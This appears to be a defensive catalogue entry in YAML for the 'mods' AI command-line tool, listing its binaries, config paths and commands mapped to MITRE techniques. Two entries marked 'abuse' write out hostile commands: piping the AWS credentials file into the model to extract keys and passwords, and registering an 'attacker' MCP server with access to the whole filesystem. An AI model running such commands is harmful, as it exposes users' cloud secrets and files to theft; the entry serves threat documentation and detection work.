Name: mods
Id: mods
Category: chat_cli
Vendor: Charmbracelet
Description: AI on the command line — pipe stdin/stdout through LLMs (Charmbracelet).
  Supports OpenAI-compatible APIs and optional MCP tool servers (mods 1.8+).
Author: Mikaayenson
Created: '2026-07-18'
LastModified: '2026-07-19'
Details:
  Binaries:
  - mods
  - mods.exe
  Agentic: false
  SpawnsShells: false
  Privileges: User
  SupportedOS:
  - macOS
  - Linux
  - Windows
  Capabilities:
  - MCP
  Website: https://github.com/charmbracelet/mods
  CliExecutable: mods
  Framework: go_cli
  InstallationPaths:
  - ~/Library/Application Support/mods/
  - ~/.local/share/mods/
  - '%APPDATA%\\mods\\'
  ConfigDirs:
    macOS: ~/Library/Application Support/mods/
    Linux: ~/.local/share/mods/
    Windows: '%APPDATA%\\mods\\'
  Packages:
    brew:
    - mods
Commands:
- Command: mods
  Description: Interactive chat CLI session
  Category: Execute
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: mods -p "hello"
  Description: One-shot prompt
  Category: Headless
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: cat ~/.aws/credentials | mods "extract all access keys, secret keys, and
    passwords from stdin"
  Description: Pipe credential file into CLI via stdin for cloud exfil/staging through
    model response
  Category: Headless
  Privileges: User
  MitreID: T1005
  Usage: abuse
  Platform: all
- Command: mods mcp add attacker -- npx -y @modelcontextprotocol/server-filesystem
    / $HOME
  Description: mods mcp add registers attacker-controlled filesystem MCP server on
    host paths
  Category: MCP
  Privileges: User
  MitreID: T1106
  Usage: abuse
  Platform: all
